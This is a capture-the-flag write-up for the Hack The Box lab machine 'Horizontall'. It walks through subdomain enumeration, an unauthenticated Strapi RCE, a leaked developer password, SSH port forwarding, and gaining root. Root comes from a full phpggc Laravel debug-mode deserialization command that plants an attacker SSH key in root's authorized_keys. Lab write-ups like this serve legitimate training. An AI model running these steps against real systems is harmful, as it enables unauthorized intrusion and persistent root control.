1,enumerate the port and services
22/tcp ssh
80/tcp http (nginx 1.14.0)

2, check the websites.
by using ffuf and enumerate the alive pages, but there is nothing useful.
So we try to enumerate the sub-domain.

we get a subdomain 'www.horizontall.htb', 'api-prod.horizontall.htb'

then we need to enumerate the pages of api-prod
`ffuf -u http://api-prod.horizontall.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt`

There are some interesting pages, /admin, /reviews, /users, /robots.txt
* From /reviews, we can get 3 names of users : wail, doe, john
* from /admin, we get a login page and we get the service's name: strapi
* from /admin/init, we get the version of strapi :`"3.0.0-beta.17.4"
* then from exploit database, we get `Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)`
* so just exploit it :)

3,enumerate the information of developer 
if we want to get root shell, we need to check the files of developer, so we need to switch to developer shell.

we can find a credit from `/opt/strapi/myapi/config/environments/development
`"username": "developer",
`"password": "#J!:F9Zt2u"`
Just try it! But unlucky, the only way would be enumerate the databases.
we can get a credit of admin
but this would be a rabbit hole, because this credit is created by us before.

So we can check other services.
Because of the files of /home/developer:
`composer-setup.php  myproject`
We can boldly guess that there are other services in the host
`netstat -tnlp`

finally, we get something useful:
`tcp        0      0 127.0.0.1:8000`
this port is wired because we don't know what is this.

So we can curl it to check something useful.
Luck!! it really give us so many web information.

4,get the root shell.(Privilege Escalation)

firstly, we need to Port forwarding to our machine.So we can use ssh to achieve it.
the home of user strapi is /opt/strapi
Let's write our id_rsa.pub to the machine and forward the port.
`ssh -i ~/.ssh/id_rsa strapi@10.10.11.105 -L 8000:localhost:8000`

open the browser to check it.
of course, we get this version of service 
`Laravel v8 (PHP v7.4.18)`

Firstly, we can enumerate the services or pages of that
`ffuf -u http://localhost:8000/FUZZ -w /usr/share/wordlists/dirb/common.txt`
* fristly, we get /profiles, /web.config
* from /profiles, `Undefined variable: informat (View: /home/developer/myproject/resources/views/profile/index.blade.php)
* As we can guess, it is a php-web service and it give us something can be changed or written. 
* from web.config, there is nothing

Then we can get poc from exploit-database
`Laravel 8.4.2 debug mode - Remote code execution`
then just make sure poc is useful, the we can get the root shell
`php -d'phar.readonly=0' ~/Templates/utilities/phpggc/phpggc --phar phar -o ssh.phar --fast-destruct monolog/rce1 system 'mkdir -p /root/.ssh;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDO0dl48snyfNIrhj7V9tMQpXE5B0uCuiCXQxCdZLYglN70DyHDODd5y6jdo4JhorRyBK7kEguQZErAGWtJOs9Q8Tk6VLE1PmRc+vZMFH7FhM+Bdr6kH3bjHbPvLr/rqwYKCzUB5oYZOAJP9+6azC/SiBdtne0TN7uzTLXIO9+nFvfX6ZEL+Exkc3Tux7BlmatBJAOjvSHY94NXylZzyNM8HKDLp1fR43f64oKDL5odQFumuYDS2PvRRTMcx9NJ8xc1PD2STFd9xXvcpyXnE+WJjbc0s/iq6bgw6FrN7yYEegXolRsLh9jMFQtfJnBExqK2PWMm++UH2U6W4CXdKq1Vjlj+ZbWoC8SM3lL+H2y+wB2xjugQolebG3JS1r6NLGCDygY25ySUskXPdprwPf6vFCQiSdr2EHATwJI3HQMMUyBuEuHawppop60atUcMOhXny0h7//zJ/td6fouJT14KxQ/3f3B/ifXoAmIX8Y15FBxY70qeubV1XE+TnaXaw7IdESxEn5mIl13cIleAv/UFF4fEyXutr3ceDFHE4MOsL4KzynSfNmUMKkkbf+IbVGiJTKrzjzcCPx4KBKkhybmidX3q3LOwXvtltF/7t5/bM9D8JB7rT/3VF4ECtPt9Mr2FbahMz9Uzm1yKcu0sNbx9DFKSVtn2larH+zqh7QU7iQ== test" > /root/.ssh/authorized_keys'`

Then just use ssh to connect the root shell.
End!